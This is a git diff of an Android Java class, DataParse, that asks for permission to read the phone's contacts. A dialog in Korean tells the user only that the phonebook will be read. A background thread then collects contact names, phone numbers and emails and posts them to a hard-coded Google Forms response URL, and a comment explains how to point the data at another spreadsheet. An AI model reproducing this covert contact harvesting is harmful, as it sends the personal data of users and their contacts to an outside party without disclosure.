@@ -20,71 +20,80 @@ import static android.widget.Toast.LENGTH_SHORT;
 
 
 /**
- * Created by HumanPlus on 2016-12-19.
+ * Created by Soobin Kim on 2016-12-19.
  */
 
-public class dataParse {
+public class DataParse {
     private String name, digit, email = null;
+    private Activity CurrentActivity;
+    private Thread thread;
 
     // MainActivity for first parameter
     // CurrentActivity for second parameter
-    public dataParse(Activity MainActivity, final Activity CurrentActivity) {
-        final Activity Mainactivity = MainActivity;
-        final Activity Currentactivity = CurrentActivity;
+    public DataParse(Activity CurrentActivity) {
+        this.CurrentActivity = CurrentActivity;
+    }
+
+    public void postData() {
+
         // Checks user's android device version
         // 6.0 이상만 이 코드가 필요함
         if(Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
-            int permissionCheck = ContextCompat.checkSelfPermission(MainActivity, Manifest.permission.READ_CONTACTS);
+            int permissionCheck = ContextCompat.checkSelfPermission(CurrentActivity, Manifest.permission.READ_CONTACTS);
 
             if (permissionCheck == PackageManager.PERMISSION_DENIED) {
-                ContextCompat.checkSelfPermission(MainActivity, Manifest.permission.READ_CONTACTS);
+                ContextCompat.checkSelfPermission(CurrentActivity, Manifest.permission.READ_CONTACTS);
+
                 // 만약에 else문에서 거절된 적이 있으면, 밑의 코드가 실행됨
-                if (ActivityCompat.shouldShowRequestPermissionRationale(MainActivity, Manifest.permission.READ_CONTACTS)) {
+                if (ActivityCompat.shouldShowRequestPermissionRationale(CurrentActivity, Manifest.permission.READ_CONTACTS)) {
                     AlertDialog.Builder dialog = new AlertDialog.Builder(CurrentActivity);
                     dialog.setTitle("권한 요청")
                             .setMessage("전화번호부를 읽습니다.")
                             .setPositiveButton("예", new DialogInterface.OnClickListener() {
                                 @Override
                                 public void onClick(DialogInterface dialog, int which) {
-                                    ActivityCompat.requestPermissions(Currentactivity, new String[]{Manifest.permission.READ_CONTACTS}, 1000);
+                                    ActivityCompat.requestPermissions(CurrentActivity, new String[]{Manifest.permission.READ_CONTACTS}, 1000);
                                 }
                             })
                             .setNegativeButton("아니오", new DialogInterface.OnClickListener() {
                                 @Override
                                 public void onClick(DialogInterface dialog, int which) {
-                                    Toast.makeText(Currentactivity, "요청이 거절되었습니다.", LENGTH_SHORT).show();
+                                    Toast.makeText(CurrentActivity, "요청이 거절되었습니다.", LENGTH_SHORT).show();
                                 }
                             }).create().show();
                 } else {
 
                     // Request READ_CONTACT to android system
                     // 최초 실행시 권한 요청청
-                    ActivityCompat.requestPermissions(MainActivity, new String[]{Manifest.permission.READ_CONTACTS}, 1000);
+                    ActivityCompat.requestPermissions(CurrentActivity, new String[]{Manifest.permission.READ_CONTACTS}, 1000);
                 }
             } else {
                 // 권한이 있을 때
                 // 전화번호부를 읽고 파싱하는 코드가 들어가야함
 
                 // 파싱 되는 걸 모두 기다릴 수 없기 때문에 쓰레드로 처리함
-                Thread thread = new Thread(new Runnable() {
+                thread = new Thread(new Runnable() {
                     @Override
                     public void run() {
-                        postData(CurrentActivity);
+                        postData2(CurrentActivity);
                     }
                 });
 
                 thread.start();
 
-                Toast.makeText(CurrentActivity, "성공", LENGTH_SHORT);
+                Toast.makeText(CurrentActivity, "성공하였습니다", LENGTH_SHORT).show();
             }
         }
     }
 
-    public void postData(Context context) {
+    private void postData2(Context context) {
         String data;
         HttpRequest mReq = new HttpRequest();
+
+        // 이 주소는 Google survey로
         String fullUrl = "https://docs.google.com/forms/d/e/1FAIpQLSc20W60NSiIaPtczC8qIScyZ4xHGyIqzszWOhPND_AccKu9UA/formResponse";
 
+        // 여기에 데이터가 투영될 것
         String[] arrNameProjection = {
                 ContactsContract.Contacts._ID,
                 ContactsContract.Contacts.DISPLAY_NAME
@@ -141,6 +150,8 @@ public class dataParse {
 
             // Parse
             // If 'email' does not exist in phonebook, will not parse 'email'
+            // If you want to parse data to another spreadsheet or storage
+            // Then you should change the url and entry number
             if(email == null) {
                 data = "entry.1521821869=" + URLEncoder.encode(name) + "&" +
                         "entry.1402370873=" + URLEncoder.encode(digit);
